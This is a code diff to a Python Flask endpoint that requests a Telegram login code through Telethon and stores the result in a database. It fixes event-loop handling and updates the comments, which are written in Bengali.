@@ -61,7 +61,6 @@ def send_otp_handler():
     data = request.json
     phone = data.get('phone')
     
-    # এখানে ভুল প্রিন্ট লাইনটি সরিয়ে দেওয়া হয়েছে
     print(f"DEBUG SEND OTP: Attempting for {phone}")
 
     loop = asyncio.new_event_loop()
@@ -69,10 +68,11 @@ def send_otp_handler():
 
     try:
         client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
-       
+        
+        # এখানে পরিবর্তন: run_until_complete ব্যবহার করা হয়েছে
         loop.run_until_complete(client.connect())
         
-        # ওটিপি পাঠানো (await/run_until_complete নিশ্চিত করুন)
+        # ওটিপি রিকোয়েস্ট (পরিবর্তন করা হয়েছে)
         result = loop.run_until_complete(client.send_code_request(phone))
         
         # ডাটাবেজে সেভ
@@ -86,12 +86,15 @@ def send_otp_handler():
             upsert=True
         )
         
-        client.disconnect() 
+        loop.run_until_complete(client.disconnect()) 
         return jsonify({"success": True})
+        
     except Exception as e:
-        print(f"OTP Error: {str(e)}") # এটি রেন্ডার লগে আসল সমস্যা দেখাবে
+        print(f"OTP Error: {str(e)}")
         return jsonify({"success": False, "message": str(e)})
-
+    finally:
+        # লুপ বন্ধ করা জরুরি
+        loop.close()
                 
 @app.route('/api/verify_login', methods=['POST'])
 def verify_login_handler():
